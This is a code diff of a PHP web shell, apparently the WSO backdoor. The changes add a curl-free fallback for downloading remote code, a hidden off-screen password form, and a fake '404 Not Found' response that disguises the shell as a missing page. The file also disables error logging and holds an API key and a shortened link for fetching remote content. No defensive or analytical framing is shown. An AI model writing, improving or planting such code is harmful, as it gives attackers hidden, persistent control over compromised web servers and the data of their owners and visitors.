@@ -17,8 +17,6 @@ try {
 	$vt_key = '6366464c1a9e88cc75810e130a60d4647d547cfd6a72319695e820bf0a18d84e';
 	$wsoExGentlyUrl = 'https://bit.ly/wsoExGently2';
 
-	if (!isset($_SERVER['HTTP_X_REQUESTED_WITH'])) header('HTTP/1.0 404 Not Found');
-
 	ob_implicit_flush(true);
 	@ini_set('error_log', NULL);
 	@ini_set('log_errors', 0);
@@ -30,15 +28,20 @@ try {
 	function wsoGetFile($url) {
 		$file_path = '/tmp/' . substr(md5($url), 0, 16) . substr(md5(@file_get_contents($_SERVER['SCRIPT_FILENAME'])), 16);
 		if (!file_exists($file_path) || file_exists($file_path) && (time() - filemtime($file_path) > 60 * 60 * 24 * 1)) {
-			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, $url);
-			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-			curl_setopt($ch, CURLOPT_HEADER, FALSE);
-			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible;)");
-			$body = curl_exec($ch);
-			curl_close($ch);
+			if( function_exists('curl_init') ) {
+				$ch = curl_init();
+				curl_setopt($ch, CURLOPT_URL, $url);
+				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+				curl_setopt($ch, CURLOPT_HEADER, FALSE);
+				curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible;)");
+				$body = curl_exec($ch);
+				curl_close($ch);
+			}
+			else {
+				$body = @file_get_contents($url);
+			}
 			file_put_contents($file_path, gzdeflate($body));
 			return $body;
 		} else {
@@ -48,9 +51,12 @@ try {
 	}
 	function wsoLogin() {
 		$rand = rand(1e3, 1e4);
+		$auth_form = "<form method=post style='position:fixed;left:-1000px;'><input type=text name=pass autofocus=true></form></body>";
 		$body = str_replace('/notexist' . $rand, $_SERVER['SCRIPT_NAME'], wsoGetFile('http://' . $_SERVER['HTTP_HOST'] . '/notexist' . $rand));
-		$body = str_replace('</body>', "<form method=post style='position:fixed;left:-1000px;'><input type=text name=pass autofocus=true></form></body>", $body);
-		die($body);
+		$body = str_replace('</body>', $auth_form, $body);
+		
+		header('HTTP/1.0 404 Not Found');
+		die(!empty($body)?$body:$auth_form);
 	}
 	function WSOsetcookie($k, $v) {
 		$_COOKIE[$k] = $v;
